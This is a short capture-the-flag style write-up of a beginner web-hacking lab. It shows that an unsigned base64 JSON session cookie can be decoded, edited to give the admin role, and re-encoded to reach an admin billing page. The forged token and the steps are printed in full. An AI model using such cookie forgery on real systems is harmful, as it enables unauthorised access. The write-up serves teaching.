---

Name: Spindrigt Workspace
Difficulty: Easy
URL: https://dashboard.webverselabs-pro.com/learning-paths/junior-web-hacker/03/honor-system
Description: Two founders, eighteen months in, no marketing budget, no AI features. They built their own session layer one weekend "because we don't need a whole library for this." A junior contractor noted in the team Linear that the cookie was "stateless and self-describing" and shipped it. 

---

```
eyJ1aWQiOjQyLCJlbWFpbCI6ImJvYkBleGFtcGxlIiwicm9sZSI6Im1lbWJlciIsImV4cCI6MTc4NzA3OTUyNH0=
```

We can base64 decode it
```
{"uid":42,"email":"bob@example","role":"member","exp":1787079524}
```

Since it's a regular base64 encoded string we can craft our own token
```
{"uid":42,"email":"admin@example","role":"admin","exp":1787079524}
```

And base64 encode it
```
eyJ1aWQiOjQyLCJlbWFpbCI6ImFkbWluQGV4YW1wbGUiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3ODcwNzk1MjR9
```

After switching the token with the new one we can access /admin/billing and read the flag
